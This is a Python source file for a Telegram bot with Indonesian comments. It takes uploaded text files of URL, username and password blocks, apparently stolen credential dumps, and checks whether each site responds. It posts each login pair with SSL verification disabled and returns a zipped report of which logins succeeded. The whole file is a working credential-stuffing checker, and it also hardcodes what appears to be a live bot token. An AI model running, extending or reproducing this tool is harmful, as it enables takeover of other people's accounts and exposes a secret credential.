import re
import os
import logging
import requests
import zipfile
from datetime import datetime
from telegram import Update, InputFile
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# Disable SSL warning
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = "7745111806:AAGmEkxVrLvgyYuTISVaYmW8i1BpRBcegEU"

# ====================================================
# LOGGER SETTING
# ====================================================
logging.basicConfig(
    level=logging.INFO,
    format='[%(levelname)s] %(message)s'
)

# ====================================================
# PERSIAPAN FOLDER REPORT
# ====================================================
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
REPORT_DIR = os.path.join(BASE_DIR, "reports")

if not os.path.exists(REPORT_DIR):
    os.makedirs(REPORT_DIR)
    logging.info(f"Membuat folder: {REPORT_DIR}")


# ====================================================
# FIX URL
# ====================================================
def fix_url(url):
    url = url.strip()

    if url.startswith("http://") or url.startswith("https://"):
        return url

    if url.startswith("www."):
        return "https://" + url

    if "." in url:
        return "https://" + url

    return None


# ====================================================
# CEK VALID FORMAT
# ====================================================
def is_valid_format(url):
    if url is None:
        return False
    if "." not in url:
        return False
    if " " in url:
        return False
    return True


# ====================================================
# CEK REACHABILITY
# ====================================================
def check_reachable(url):
    try:
        r = requests.get(url, timeout=5, verify=False)
        return r.status_code
    except Exception as e:
        logging.error(f"[REACH] URL gagal diakses → {url} | Error: {e}")
        return None


# ====================================================
# CEK LOGIN (TEST POST)
# ====================================================
def quick_login_check(url, user, pw):
    logging.info(f"[CHECK] LOGIN TEST: {url} | USER: {user}")

    try:
        data = {"username": user, "password": pw}
        r = requests.post(url, data=data, timeout=5, verify=False)

        if r.status_code >= 500:
            return "SERVER ERROR"

        body = r.text.lower()

        if "invalid" in body or "error" in body:
            return "FAILED LOGIN"

        if r.status_code == 200:
            return "SUCCESS LOGIN"

        return f"UNKNOWN ({r.status_code})"

    except Exception as e:
        return f"EXCEPTION: {e}"


# ====================================================
# PARSE BLOK DATA
# ====================================================
def parse_blocks(text):
    logging.info("Parsing blok data...")

    pattern = r"====\s*URL\s*:\s*(.*?)\s*Use\s*:\s*(.*?)\s*PW\s*:\s*(.*?)\s*===="
    matches = re.findall(pattern, text, re.DOTALL)

    logging.info(f"Total blok ditemukan: {len(matches)}")

    results = []
    for url, user, pw in matches:
        results.append({
            "url": url.strip(),
            "user": user.strip(),
            "pw": pw.strip()
        })

    return results


# ====================================================
# /start
# ====================================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logging.info("[START] User menjalankan /start")
    await update.message.reply_text("Upload file .txt Anda untuk diproses.")


# ====================================================
# HANDLE FILE
# ====================================================
async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):

    document = update.message.document
    filename = document.file_name

    logging.info(f"[FILE] Diterima: {filename}")

    if not filename.endswith(".txt"):
        await update.message.reply_text("File harus berformat .txt")
        return

    save_path = os.path.join(REPORT_DIR, filename)
    tg_file = await document.get_file()
    await tg_file.download_to_drive(save_path)
    logging.info(f"[FILE] Disimpan ke: {save_path}")

    await update.message.reply_text("File diterima. Memulai proses scanning...")

    with open(save_path, "r") as f:
        content = f.read()

    blocks = parse_blocks(content)

    success_logs = []
    failed_logs = []
    anomaly_logs = []

    timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")

    # ------------------------------------------------
    # LOOP UTAMA
    # ------------------------------------------------
    for item in blocks:
        raw_url = item["url"]
        user = item["user"]
        pw = item["pw"]

        logging.info("===========================================")
        logging.info(f"[PROCESS] URL RAW  : {raw_url}")
        logging.info(f"[PROCESS] USER RAW : {user}")

        # 1. Fix URL
        url = fix_url(raw_url)

        if not is_valid_format(url):
            logging.error(f"[INVALID URL FORMAT] {raw_url}")
            failed_logs.append(f"{raw_url}\n{user}\n{pw}\nINVALID URL FORMAT\n----\n")
            continue

        logging.info(f"[URL FIXED] → {url}")

        # 2. Cek reachability
        status = check_reachable(url)

        if status is None:
            failed_logs.append(f"{url}\n{user}\n{pw}\nURL DEAD\n----\n")
            continue

        logging.info(f"[REACHABLE] Status: {status}")

        # 3. Anomaly
        if "(" in user or ")" in user or len(user) > 50:
            logging.warning(f"[ANOMALY] USER: {user}")
            anomaly_logs.append(f"{url}\n{user}\n{pw}\nANOMALY\n----\n")

        # 4. Login
        result = quick_login_check(url, user, pw)

        if "SUCCESS" in result:
            success_logs.append(f"{url}\n{user}\n{pw}\nSUCCESS LOGIN\n----\n")
        else:
            failed_logs.append(f"{url}\n{user}\n{pw}\n{result}\n----\n")

        logging.info(f"[RESULT] {result}")

    # ------------------------------------------------
    # GENERATE REPORT FILES
    # ------------------------------------------------
    report_success = os.path.join(REPORT_DIR, f"success_{timestamp}.txt")
    report_failed = os.path.join(REPORT_DIR, f"failed_{timestamp}.txt")
    report_anomaly = os.path.join(REPORT_DIR, f"anomaly_{timestamp}.txt")

    if success_logs:
        with open(report_success, "w") as f:
            f.write("=== SUCCESS LOGIN REPORT ===\n\n")
            f.writelines(success_logs)

    if failed_logs:
        with open(report_failed, "w") as f:
            f.write("=== FAILED LOGIN REPORT ===\n\n")
            f.writelines(failed_logs)

    if anomaly_logs:
        with open(report_anomaly, "w") as f:
            f.write("=== ANOMALY REPORT ===\n\n")
            f.writelines(anomaly_logs)

    logging.info("[REPORT] Semua report berhasil dibuat.")

    # ------------------------------------------------
    # ZIP REPORTS (file timestamp saja)
    # ------------------------------------------------
    zipname = os.path.join(REPORT_DIR, f"report_{timestamp}.zip")

    with zipfile.ZipFile(zipname, "w", zipfile.ZIP_DEFLATED) as zipf:
        for file in [report_success, report_failed, report_anomaly]:
            if os.path.exists(file):
                zipf.write(file, arcname=os.path.basename(file))

    logging.info(f"[ZIP] Dibuat: {zipname}")

    await update.message.reply_document(
        document=InputFile(zipname),
        caption="Berikut hasil scanning lengkap."
    )

    logging.info("[DONE] Semua proses selesai.")


# ====================================================
# MAIN APP
# ====================================================
def main():
    logging.info("[BOT] Starting up...")
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))

    logging.info("[BOT] Ready. Waiting for updates...")
    app.run_polling()


if __name__ == "__main__":
    main()
